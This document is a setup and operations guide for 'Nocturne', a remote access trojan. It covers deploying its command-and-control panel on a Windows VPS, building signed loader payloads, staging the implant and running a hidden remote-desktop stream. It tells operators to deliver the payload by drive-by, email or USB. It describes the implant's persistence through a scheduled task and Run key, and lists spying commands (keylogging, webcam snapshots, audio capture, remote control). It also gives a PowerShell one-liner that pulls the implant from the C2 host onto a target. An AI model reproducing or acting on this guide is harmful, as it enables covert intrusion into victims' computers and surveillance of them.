# Nocturne (RATS) — Full Setup on a Windows VPS

**One file covering the whole stack:** the **remote files** the implants fetch, the
**panel** (Nocturne web C2), and the **netvnc stream** (live screen / remote control).
Written against the actual code in this repo (client.py, loader_py.c, panel/).
Verified constants are taken from `panel/config.py`, `panel/builder.py` and
`client.py` stream section.

---

## Table of contents

1. [Architecture overview](#1-architecture-overview)
2. [Directory layout](#2-directory-layout)
3. [VPS prerequisites](#3-vps-prerequisites)
4. [Install toolchain](#4-install-toolchain)
5. [Deploy the code to the VPS](#5-deploy-the-code-to-the-vps)
6. [Part A — Remote files (what implants pull, and where they live)](#part-a--remote-files)
7. [Part B — The panel](#part-b--the-panel)
8. [Part C — The stream (netvnc relay)](#part-c--the-stream-netvnc)
9. [Firewall](#9-firewall)
10. [Run as a service (auto-start)](#10-run-as-a-service)
11. [First boot](#11-first-boot)
12. [Build a payload end-to-end](#12-build-a-payload-end-to-end)
13. [Operate a target](#13-operate-a-target)
14. [Backups & maintenance](#14-backups--maintenance)
15. [Troubleshooting](#15-troubleshooting)
16. [Environment variables cheat-sheet](#16-environment-variables-cheat-sheet)

---

## 1. Architecture overview

Three cooperating pieces make an implant work:

```
  TARGET MACHINES                          WINDOWS VPS (this guide)
┌───────────────────────┐          ┌───────────────────────────────────────────┐
│ loader .exe           │          │ Nocturne panel  (python run_panel.py)     │
│   │ downloads         │  HTTP    │   ├─ Flask UI / login / console   :5000   │
│   ├─client.py         │ ───────► │   ├─ /stage/<token>/client.py  (files)   │
│   ├─python embed zip  │          │   ├─ /py/<zip>          (files/py)       │
│   │ runs client.py    │          │   ├─ /download/<id>   (payload binaries) │
│   ▼                   │          │   ├─ /target/<id>/viewer  (stream page)  │
│ beacon  ◄────────────►│  TCP 4444│   └─ C2 reverse-TCP listener      :4444   │
│   (reports in, gets   │  C2      │   └─ SQLite panel.db (users/licenses/    │
│    commands)          │          │       payloads/targets/commands)         │
│   │                   │          └───────────────────────────────────────────┘
│   ▼ stream on/off     │                 ┌───────────────────────────────┐
│ node + netvnc bundle  │   WSS          │ netvnc relay (self-host or     │
│   ▼                   │ ─────────────► │ netvnc.xyrasms.net default):   │
│ WebRTC publisher      │  signaling     │  /ws  signaling  (wss, 443)    │
│                       │                │  /control remote-input (wss)   │
│                       │                │  :3478 STUN/TURN (udp+tcp)     │
│                       │                │  viewer static  https://...    │
│                       │                └───────────────────────────────┘
```

* The **panel process is one thing**: HTTP (Flask/waitress) + C2 listener in the
  same process (see `panel/run_panel.py`).
* The **remote files** are mostly *generated* by the panel at build time and
  *served by the panel itself* (`/stage/…`, `/py/…`, `/download/…`). Two files are
  *not* generated locally and must be uploaded once: the netvnc target-side bundle
  and the Node runtime zip (they are currently hosted on the
  `weatechltd/downloads` GitHub raw repo — see Part A).
* The **stream** is a separate WebRTC signalling/TURN relay. Out of the box every
  component points at `netvnc.xyrasms.net`. You can keep that managed relay, or
  self-host it (Part C) and re-point everything with 4 environment variables.

---

## 2. Directory layout

Copy the whole `Rats` project to `C:\Rats` on the VPS:

```
C:\Rats\
├── client.py                  base implant source (builds patch a private copy)
├── loader_py.c                loader C source (gcc-compiled per payload)
├── WINDOWS_VPS_SETUP.md       this file
├── panel\
│   ├── run_panel.py           launcher: db → app → c2 → waitress
│   ├── app.py                 Flask routes/auth/admin/console API
│   ├── c2.py                  reverse-TCP listener + per-target workers
│   ├── db.py                  sqlite schema + helpers (WAL)
│   ├── builder.py             payload builder (patches client.py, gcc, sign)
│   ├── config.py              single source of truth (edit or use env vars)
│   ├── static\  templates\    UI
│   ├── files\
│   │   ├── py\                ★ upload python-embed zips here (5 files)
│   │   ├── work\              per-build scratch (auto)
│   │   ├── stage\<token>\     served copies of client.py (auto per build)
│   │   └── icons\             custom .ico files (auto)
│   ├── panel.db               sqlite database (auto-created on first run)
│   └── secret_key             flask session key (auto-created)
└── _codesign.pfx / _codesign.pass    optional Authenticode signing
```

> Keep `client.py` and `loader_py.c` at the *Rats root* — `config.py` reads them
> from there (`RATS_DIR`) and the builder never modifies them.

---

## 3. VPS prerequisites

| Requirement | Why | Notes |
|---|---|---|
| Windows Server 2019/2022 or Win10/11 x64 | panel host | 2 GB RAM min, 20 GB disk |
| Static public IP (or domain) | C2 + stage reachability | firewall rules to match |
| Python 3.12 x64 | panel runtime | 3.8+ works, 3.12 tested |
| MinGW gcc | compiling loader exe | exe payloads; `src` payloads don't need it |
| signtool (Windows SDK) | Authenticode signing | optional — skip for internal use |
| Ports open | 5000, 4444 | inbound TCP |
| Domain + TLS (optional) | stream relay | only if self-hosting the relay |

---

## 4. Install toolchain

```powershell
# ---- Python 3.12 (all users, add to PATH) ----
# https://www.python.org/ftp/python/3.12.10/python-3.12.10-amd64.exe
python --version

# ---- Python deps ----
pip install --upgrade pip setuptools wheel
pip install flask waitress requests

# ---- gcc (two options) ----
# A) MSYS2: https://www.msys2.org/  then in "MSYS2 UCRT64":
#    pacman -S --noconfirm mingw-w64-ucrt-x86_64-gcc
#    then add C:\msys64\ucrt64\bin to the SYSTEM PATH.
# B) WinGet:
winget install MSYS2.MSYS2
gcc --version

# ---- Windows SDK for signtool (optional) ----
# https://developer.microsoft.com/windows/downloads/windows-sdk/
# signtool ends up at e.g.:
#   C:\Program Files (x86)\Windows Kits\10\bin\10.0.26100.0\x64\signtool.exe
```

If the SDK version on the VPS differs from the dev box, set in `panel\config.py`:

```python
SIGN_TOOL = r"C:\Program Files (x86)\Windows Kits\10\bin\<YOURVER>\x64\signtool.exe"
```

To disable signing entirely: `SIGN_TOOL = None` in `config.py`, or run with
`SET SIGN_TOOL=` in the service environment (Part 10).

---

## 5. Deploy the code to the VPS

```powershell
# Option A: git
git clone https://github.com/<you>/Rats.git C:\Rats
cd C:\Rats

# Option B: zip copy — on the dev machine
Compress-Archive -Path C:\Users\weate\Documents\Rats -DestinationPath rats.zip
# copy rats.zip to the VPS (scp / rdp / cloud drive), then on the VPS:
Expand-Archive -Path C:\rats.zip -DestinationPath C:\Rats -Force
```

Copy the latest dev `client.py` (all current fixes: webcam dshow snap, audio
vol/mute, loader relocation scan) over the VPS copy **before** building payloads.

---

## Part A — Remote files

"What files does an implant need, and where does it get them?"

### A.1 Generated per build (no manual work)

Each payload build (`panel/builder.py`) creates and serves:

| File | URL on the VPS | Purpose |
|---|---|---|
| patched `client.py` | `http://VPS:5000/stage/<build_token>/client.py` | fetched by the loader, fed to `python -I -` |
| payload `.exe` | `http://VPS:5000/download/<payload_id>` | the signed loader (kind=`exe`) |
| `run.py` + `RUN.bat` | same `/stage/<token>/` dir | kind=`src` bootstrap |
| patched client.py copy | `files\work\<token>\client.py` | build workspace (not served) |

The loader downloads **client.py** from `STAGE_PUBLIC_BASE`, i.e.
`http://VPS_IP:5000/stage/<token>/client.py`, at run time — so **the stage file
must be reachable from every target**.

### A.2 Upload once (python runtimes)

The loader/RUN.bat downloads an *embeddable python zip* by target OS/arch from
`http://VPS:5000/py/<zipname>`. Upload all five to `C:\Rats\panel\files\py\`:

```powershell
$dest = "C:\Rats\panel\files\py"
New-Item -ItemType Directory -Force -Path $dest | Out-Null
$urls = @(
  "https://www.python.org/ftp/python/3.12.10/python-3.12.10-embed-amd64.zip",
  "https://www.python.org/ftp/python/3.12.10/python-3.12.10-embed-arm64.zip",
  "https://www.python.org/ftp/python/3.12.10/python-3.12.10-embed-win32.zip",
  "https://www.python.org/ftp/python/3.8.10/python-3.8.10-embed-amd64.zip",
  "https://www.python.org/ftp/python/3.8.10/python-3.8.10-embed-win32.zip"
)
foreach ($u in $urls) { Invoke-WebRequest $u -OutFile "$dest\$(Split-Path $u -Leaf)" }
Get-ChildItem $dest
```

Selection logic (target side):
* Win10/11 **x64** → `3.12.10 …-amd64` (default)
* Win10/11 **arm64** → `…-arm64`
* Win10/11 **x86/32-bit** → `…-win32`
* **Win7/8.0** (any) → `3.8.10 …-amd64` (last Win7-capable line)

If one is missing, targets on that OS class fail at bootstrap with a 404 — the
loader waits and retries, but the zip must exist for them to ever phone home.

### A.3 Upload once (stream runtime — the netvnc bundle + Node)

When a target runs `stream on` for the first time, `client.py` lazily pulls two
files and unpacks them under `%USERPROFILE%\.cache\nvnode\` and `…\nvdesk\`:

```
https://raw.githubusercontent.com/weatechltd/downloads/main/node-v22.14.0-win-x64.zip
https://raw.githubusercontent.com/weatechltd/downloads/main/netvnc_desktop_win64.zip
```

Those live in the **weatechltd/downloads GitHub repo** today (the URLs are baked
into `client.py` ~line 633/634 as XOR-obfuscated constants). To re-point them at
your own host, edit those two lines **before building the payload** (the builder
copies `client.py`, so a rebuild is required), e.g.:

```python
NODE_ZIP_URL = _x("<obfuscated http://VPS:8000/node-v22.14.0-win-x64.zip>")
BUNDLE_URL  = _x("<obfuscated http://VPS:8000/netvnc_desktop_win64.zip>")
```

(or keep the GitHub raw repo in sync with `netvnc_desktop_win64.zip` — simplest —
and only change the signalling URLs in Part C).

### A.4 Full remote-files checklist

```
C:\Rats\panel\files\py\
    python-3.12.10-embed-amd64.zip        ← upload
    python-3.12.10-embed-arm64.zip        ← upload
    python-3.12.10-embed-win32.zip        ← upload
    python-3.8.10-embed-amd64.zip         ← upload
    python-3.8.10-embed-win32.zip         ← upload

GitHub weatechltd/downloads (or your own host):
    node-v22.14.0-win-x64.zip             ← upload
    netvnc_desktop_win64.zip              ← upload

Panel auto-creates per build:
    files\stage\<build_token>\client.py
    files\stage\<build_token>\run.py, RUN.bat   (kind=src)
    files\work\<build_token>\…                (build workspace)
```

---

## Part B — The panel

### B.1 Environment (set these before every start — or in the service)

```powershell
# On the VPS: replace 203.0.113.10 with the real public IP / domain
$env:C2_PUBLIC_HOST      = "203.0.113.10"          # what implants dial back to
$env:C2_PUBLIC_PORT      = "4444"
$env:STAGE_PUBLIC_BASE   = "http://203.0.113.10:5000"
$env:PANEL_ADMIN_PASSWORD = "A-Strong-Admin-Pass!"
```

Defaults in `config.py` (lines 243–252) are the dev-box values
(`127.0.0.1`) — **the three env vars above are mandatory on a VPS** or the
implants will be told to dial `127.0.0.1`.

### B.2 Start it

```powershell
cd C:\Rats\panel
python run_panel.py
```

Expected first-run output:

```
INFO run_panel: database ready at C:\Rats\panel\panel.db
WARNING ==================================================
WARNING BOOTSTRAP ADMIN CREATED
WARNING   username : admin
WARNING   password : <generated or your PANEL_ADMIN_PASSWORD>
WARNING ==================================================
INFO c2: C2 listener started on 0.0.0.0:4444
INFO run_panel: panel listening on http://0.0.0.0:5000 (C2 on 0.0.0.0:4444)
INFO run_panel: serving via waitress
```

Check both sockets are listening:

```powershell
netstat -an | findstr ":5000 :4444"
```

Open `http://203.0.113.10:5000/login`, sign in as `admin`, register builders,
activate a licence (`DAMI-…` key via admin) and build payloads.

### B.3 What the panel runs

| File | Role |
|---|---|
| `run_panel.py` | boot order: `db.init_db()` → `ensure_admin()` → `c2.start()` → serve |
| `app.py` | routes, auth (pbkdf2_sha256$200000), CSRF, admin, console API |
| `c2.py` | accept loop on `:4444`, one worker per target, drains sqlite queue |
| `builder.py` | sync build: copy+patch client.py → gcc `loader_py.c` → sign |
| `config.py` | everything tunable; env overrides win for C2/stage/stream |

---

## Part C — The stream (netvnc)

### C.1 How it works (no code changes needed)

1. Operator sends `stream on` (or clicks *Remote control on* in the target console).
2. Target installs Node + the netvnc bundle (Part A.3) if missing.
3. `deploy_stream()` (`client.py` ~line 691) starts a detached hidden node process:
   `node stream-video-script.js --room <room> --stream-url wss://…/ws [--allow-control]`
4. The streamer opens a WebRTC connection through the relay: signalling over
   `STREAM_WS`, control (mouse/keyboard) over the relay's `/control` channel.
5. The operator watches via the **panel-hosted viewer page**:
   `http://VPS:5000/target/<id>/viewer` (route `target_viewer` in `app.py`,
   authenticated by the panel session, iframe-embedded in the target console).
   `viewer.html` is injected with `STREAM_WS`, `STREAM_CTRL_WS` and the ICE list
   from `config.py` at render time.
6. `stream status` on the target prints e.g.
   `netvnc stream: RUNNING pid=… room=… control=…` plus a viewer URL
   `viewer: https://netvnc.xyrasms.net/?room=…` for the standalone page.

### C.2 The relay — hosted default vs self-host

All URLs are `config.py` constants, overridable by environment variables:

```python
STREAM_VIEWER_BASE = os.environ.get("STREAM_VIEWER_BASE", "https://netvnc.xyrasms.net")
STREAM_WS          = os.environ.get("STREAM_WS",          "wss://netvnc.xyrasms.net/ws")
STREAM_CTRL_WS     = os.environ.get("STREAM_CTRL_WS",     "wss://netvnc.xyrasms.net/control")

STREAM_ICE_SERVERS = [
    {"urls": "stun:netvnc.xyrasms.net:3478"},
    {"urls": "turn:netvnc.xyrasms.net:3478?transport=udp",
     "username": "<user>", "credential": "<secret>"},
]
```

* **Out of the box** everything uses the managed relay at `netvnc.xyrasms.net`
  (signalling, control, STUN/TURN and the standalone viewer). Zero relay setup.
* **Self-hosting the relay** means running four things and pointing the env vars
  at your domain:

| Component | What it does | Port |
|---|---|---|
| signalling server (`/ws`) | WebRTC peer exchange between streamer and viewer | 443 wss (TLS) |
| control channel (`/control`) | forwards remote mouse/keyboard → streamer | 443 wss |
| STUN/TURN server | NAT traversal (required for real-world targets) | 3478 udp+tcp |
| viewer static site | standalone viewer at `https://relay/?room=<id>` | 443 https |

  Re-point the whole stack on the VPS without editing code:

```powershell
$env:STREAM_VIEWER_BASE = "https://relay.example.com"
$env:STREAM_WS          = "wss://relay.example.com/ws"
$env:STREAM_CTRL_WS     = "wss://relay.example.com/control"
```

  and edit the ICE list + TURN credentials in `config.py`. The *desktop
  streamer* on targets reads the same signalling URL from its `--stream-url`
  flag; ICE overrides for the streamer come from `NETVNC_ICE_SERVERS` (see the
  note in `config.py`). Note the target-side URLs (`STREAM_WS`, `VIEWER_BASE`)
  are also hard-coded in `client.py` (XOR-obfuscated, ~lines 631–632) — changing
  the relay therefore requires **editing client.py and rebuilding the payload**,
  while panel-side changes are hot via env vars.

> TURN recommended over "just STUN": most enterprise/ISP NATs need the TURN
> relay for the video to flow at all.

---

## 9. Firewall

```powershell
# Windows Firewall (admin)
New-NetFirewallRule -DisplayName "Nocturne HTTP"   -Direction Inbound -LocalPort 5000 -Protocol TCP -Action Allow
New-NetFirewallRule -DisplayName "Nocturne C2"     -Direction Inbound -LocalPort 4444 -Protocol TCP -Action Allow
# Self-hosted relay (Part C):
New-NetFirewallRule -DisplayName "Nocturne TURN"   -Direction Inbound -LocalPort 3478 -Protocol TCP -Action Allow
New-NetFirewallRule -DisplayName "Nocturne TURN2"  -Direction Inbound -LocalPort 3478 -Protocol UDP -Action Allow
```

Then open **5000/tcp** and **4444/tcp** (and 3478 if relay is on this box) in the
cloud provider's security group too.

---

## 10. Run as a service

The panel must survive log-offs/reboots → run it as a service. NSSM is the
simplest (one process, restart on crash, env vars, log files):

```powershell
# https://nssm.cc/download → C:\Tools\nssm-2.24\win64\nssm.exe
cd C:\Tools\nssm-2.24\win64
.\nssm install Nocturne "C:\Rats\panel\python.exe" "C:\Rats\panel\run_panel.py"
.\nssm set Nocturne AppDirectory "C:\Rats\panel"
.\nssm set Nocturne AppStdout "C:\Rats\panel\_panel_stdout.log"
.\nssm set Nocturne AppStderr "C:\Rats\panel\_panel_err.log"
.\nssm set Nocturne AppRotateFiles 1
.\nssm set Nocturne AppRotateBytes 10485760
.\nssm set Nocturne RestartDelay 5000
.\nssm set Nocturne Environment `
  "C2_PUBLIC_HOST=203.0.113.10|C2_PUBLIC_PORT=4444|STAGE_PUBLIC_BASE=http://203.0.113.10:5000|PANEL_ADMIN_PASSWORD=AdminPass123"
.\nssm start Nocturne
sc qc Nocturne
```

Verify after a reboot that the service is `RUNNING` and both ports listen. Note:
payload *builds* shell out to `gcc`/`signtool` — if the service account can't
see them in PATH, give NSSM the full machine PATH (`.\nssm set Nocturne AppEnvironmentExtra Path=…`) or run as LocalSystem.

---

## 11. First boot

1. Service running, ports up (Part 10 / 9).
2. `http://203.0.113.10:5000/login` → `admin` / the password from the log
   (`_panel_stdout.log` keeps the first-run banner).
3. Admin area → issue a licence key (`DAMI-…`) → give it to a builder account.
4. Register a builder user → activate the key → build payloads.

---

## 12. Build a payload end-to-end

1. Panel → **Payloads → Build New**.
2. Fill in: name, kind (`exe` = signed single loader; `src` = python-script
   bundle), icon, builder, licence.
3. Build (sync). The builder:
   * copies `client.py`, patches the anchors — `LHOST`/`LPORT` (from
     `C2_PUBLIC_*`), `BUILD_ID`, timeout, `_panel_*` hookups;
   * `kind=exe`: writes `_loader_py_cfg.h`, embeds the icon, `gcc -mwindows
     -O2 -s loader_py.c`, signs with signtool (if configured);
   * stages the patched client at `files\stage\<token>\client.py`.
4. Status flips to `ready`; **Download** fetches the .exe.
5. Sanity-check the served stage file over HTTP:

```powershell
curl http://203.0.113.10:5000/stage/<token>/client.py -o check.py
certutil -hashfile check.py SHA256   # must equal the DB sha256 for the payload
```

### Payload QA checklist

```powershell
# 1) database row
cd C:\Rats\panel
python -c "import sqlite3; c=sqlite3.connect('panel.db'); [print(r) for r in c.execute('select id,file_name,kind,status,size_bytes,substr(sha256,1,16) from payloads order by id desc limit 3')]"
# 2) files on disk
dir C:\Rats\panel\files\stage\<token>\
# 3) signature valid (if signed)
"C:\Program Files (x86)\Windows Kits\10\bin\10.0.26100.0\x64\signtool.exe" verify /pa C:\Rats\panel\files\work\<token>\*.exe
```

---

## 13. Operate a target

**Deliver** the built .exe to the target (web drive-by, email, USB…) and run it.
The loader installs the implant + persistence (`RuntimeUpdateTask` scheduled task
at logon, `.cache` layout, optional HKCU Run key) and the beacon dials
`C2_PUBLIC_HOST:C2_PUBLIC_PORT`.

**Confirm** on the panel → Targets → new row → *Last seen* fresh (online window
120 s), then open the console and try:

```
ping
term whoami
procs
shot
webcam list        webcam snap 0
audio status       audio vol 75     audio mute on
keylog on
files
stream status      stream on        stream control on
```

The stream card embeds the viewer iframe (`/target/<id>/viewer`); `stream status`
on the target also prints the standalone `viewer: https://…/?room=<room>` link.

**Bare-bones bootstrap from a shell on the target** (no .exe drop):

```powershell
powershell -NoProfile -c "$u='http://203.0.113.10:5000/stage/<token>/client.py'; Invoke-WebRequest $u -OutFile $env:TEMP\c.py; python -c \"import urllib.request as u;u.urlretrieve('http://203.0.113.10:5000/py/python-3.12.10-embed-amd64.zip',$env:TEMP\\py.zip)\""
```

(For `src` payloads the panel already provides `run.py` doing exactly this, with
per-arch zip selection — the normal path is simply downloading the built artifact.)

---

## 14. Backups & maintenance

**Back up** (at minimum after each payload build and daily):

```
C:\Rats\panel\panel.db        # users, licences, payloads, targets, command log
C:\Rats\panel\secret_key      # flask sessions — losing it logs everyone out
C:\Rats\panel\files\stage\*   # served client.py copies (re-downloadable, but cheap)
C:\Rats\panel\files\work\*    # built binaries + icons per payload
C:\Rats\client.py  C:\Rats\loader_py.c   # the source of truth
```

Rotate logs: NSSM `AppRotateBytes` handles it; keep `_panel_stdout.log` /
`_panel_err.log` for C2 troubleshooting.

Housekeeping (safe anytime while the panel runs — sqlite is in WAL):

```powershell
cd C:\Rats\panel
python -c "import sqlite3; c=sqlite3.connect('panel.db'); c.execute('PRAGMA integrity_check'); c.execute('VACUUM'); c.close()"
```

**Password recovery:** the panel prints the bootstrap password only on first
boot. To reset, delete all `is_admin=1` users and restart — a fresh admin is
minted and printed (see panel README). Or reset directly:

```python
import sqlite3, secrets, hashlib
c = sqlite3.connect("panel.db")
pw = "NewAdminPass1!"; salt = secrets.token_hex(16)
h  = hashlib.pbkdf2_hmac("sha256", pw.encode(), salt.encode(), 200000).hex()
c.execute("update users set pass_hash=? where id=1",
          (f"pbkdf2_sha256$200000${salt}${h}",))
c.commit(); c.close()
```

---

## 15. Troubleshooting

| Symptom | Cause / fix |
|---|---|
| Panel won't bind | port busy (`netstat -an \| findstr ":5000"`), or missing `waitress` (falls back to flask dev server), or Python < 3.8 |
| Build fails: *gcc not found* | add MinGW bin to PATH / NSSM AppEnvironmentExtra; test `gcc --version` in the service account |
| Build fails at signing | cert/PFX missing or wrong SDK signtool path → `SIGN_TOOL=None` to skip, or fix the path in `config.py` |
| Target never appears | loader can't reach `/stage` or `/py` (check `STAGE_PUBLIC_BASE`), or C2 port blocked (`Test-NetConnection VPS -Port 4444`), or missing python zip → check `_panel_err.log` for accepted beacons |
| Commands time out | target off / `CMD_REPLY_TIMEOUT` (240 s) too short for `systeminfo`; raise in `config.py` |
| `webcam snap` → *I/O error* | stale client.py without the dshow fix → rebuild from the current `client.py` (`dev_arg = "video=" + cand` present?) |
| `stream on` stuck deploying | target can't download node/bundle zips (firewall/proxy), or relay URLs stale → update `client.py` constants + rebuild; check `stream log` on the target |
| Viewer loads but black/no video | STUN/TURN unreachable from target or operator network → open 3478 udp+tcp; check ICE in `config.py` |
| Lost admin password | see Part 14 reset snippet |
| Implants connect but db shows offline | clock skew or `ONLINE_WINDOW` (120 s) too tight for the poll interval → raise it |
| `secret_key` deleted | sessions invalid; panel re-creates on restart, everyone re-logs-in |

---

## 16. Environment variables cheat-sheet

| Variable | Default | Set on VPS to |
|---|---|---|
| `C2_PUBLIC_HOST` | `127.0.0.1` | **public IP / domain** (dial-back for implants) |
| `C2_PUBLIC_PORT` | `4444` | `4444` (or your NAT-mapped C2 port) |
| `STAGE_PUBLIC_BASE` | `http://127.0.0.1:5000` | `http://VPS:5000` (where /stage + /py are served) |
| `PANEL_ADMIN_PASSWORD` | auto-generated | your own bootstrap password |
| `STREAM_VIEWER_BASE` | `https://netvnc.xyrasms.net` | your relay's viewer origin |
| `STREAM_WS` | `wss://netvnc.xyrasms.net/ws` | your relay signalling URL |
| `STREAM_CTRL_WS` | `wss://netvnc.xyrasms.net/control` | your relay control URL |
| `NETVNC_ICE_SERVERS` | (baked config) | your STUN/TURN JSON for the desktop streamer |
| `SIGN_TOOL` | SDK signtool path | empty to disable signing |
| `GCC` | auto (`shutil.which`) | full path to gcc if not in PATH |

Static (edit `config.py`, non-env): `HTTP_HOST/PORT` (0.0.0.0:5000),
`C2_HOST/PORT` (0.0.0.0:4444 bind), `STREAM_ICE_SERVERS`,
`SIGN_CERT_NAME`/`SIGN_PFX`/`SIGN_PASS_FILE`, timeouts and limits.

---

*Document version 1.1 — 2026-09-06. Verified against this repo's config.py,
builder.py, run_panel.py and client.py stream/webcam constants.*
